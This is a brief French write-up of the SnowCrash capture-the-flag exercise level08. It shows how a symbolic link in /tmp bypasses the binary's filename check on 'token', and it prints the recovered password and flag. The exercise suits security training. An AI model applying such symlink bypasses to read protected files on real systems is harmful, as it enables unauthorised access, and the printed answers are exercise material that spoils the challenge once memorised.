en decompilant on peux voir qu'il lis un fichier que si sont nom est different de token, il suffit donc de faire un lien symbolique de token avec un autre nom de fichier dans tmp

~$ ln -s /home/user/level08/token /tmp/link
~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean

~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
